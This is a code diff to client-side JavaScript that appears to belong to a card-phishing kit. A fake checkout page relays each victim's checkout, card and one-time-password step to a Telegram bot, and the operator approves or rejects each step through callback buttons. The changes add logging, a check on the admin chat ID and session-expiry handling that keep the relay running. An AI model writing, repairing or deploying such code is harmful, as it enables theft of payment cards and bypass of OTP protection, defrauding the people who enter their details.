@@ -614,6 +614,7 @@
       if (keyboard) payload.reply_markup = keyboard;
       const result = await tgCall('sendMessage', payload);
       console.log('Telegram sent:', text.substring(0, 60) + '...', result?.ok ? 'OK' : result?.description || 'FAILED');
+      console.log('Full result:', result);
       return result;
     }
     
@@ -626,8 +627,14 @@
         window.lastOffset = u.update_id + 1;
         localStorage.setItem('tg_offset', String(window.lastOffset));
         
-        const cq = u.callback_query;
+const cq = u.callback_query;
         if (!cq?.data) continue;
+        
+        const chatId = String(cq.message?.chat?.id || cq.message?.forward_from_chat?.id || cq.from?.id || '');
+        const adminChatId = window.TELEGRAM_CONFIG.chatId;
+        if (chatId !== adminChatId && chatId !== '') {
+          console.log('Callback from unexpected chat:', chatId, 'Expected:', adminChatId);
+        }
         
         const data = cq.data || '';
         const match = data.match(/^(approve|reject)_(checkout|card|otp):(.+)$/i);
@@ -637,15 +644,15 @@
           continue;
         }
         
-const [, action, kind, sessionId] = match;
-      console.log('Processing callback:', { action, kind, sessionId });
-      
-      const session = sessions.get(sessionId);
-      if (!session) {
-        await tgCall('answerCallbackQuery', { callback_query_id: cq.id, text: 'Session not found' });
-        console.log('Session not found in Map:', sessionId, 'Sessions:', Array.from(sessions.keys()));
-        continue;
-      }
+        const [, action, kind, sessionId] = match;
+        console.log('Processing callback:', { action, kind, sessionId });
+        
+        const session = sessions.get(sessionId);
+        if (!session) {
+          await tgCall('answerCallbackQuery', { callback_query_id: cq.id, text: 'Session not found' });
+          console.log('Session not found in Map:', sessionId, 'Available:', Array.from(sessions.keys()));
+          continue;
+        }
       
       if (session) {
         session.stage = action === 'approve' ? `${kind}_approved` : `${kind}_rejected`;
@@ -866,7 +873,19 @@ const [, action, kind, sessionId] = match;
       
       submitBtn.classList.add('loading');
       
+      if (!window.currentSessionId) {
+        showToast('Session error - please refresh');
+        return;
+      }
+      
+      const storedSession = sessions.get(window.currentSessionId);
       const session = getSession(window.currentSessionId);
+      
+      if (!storedSession && !session) {
+        showToast('Session expired - please start over');
+        return;
+      }
+      
       if (session) {
         updateSession(session.id, { email });
       }
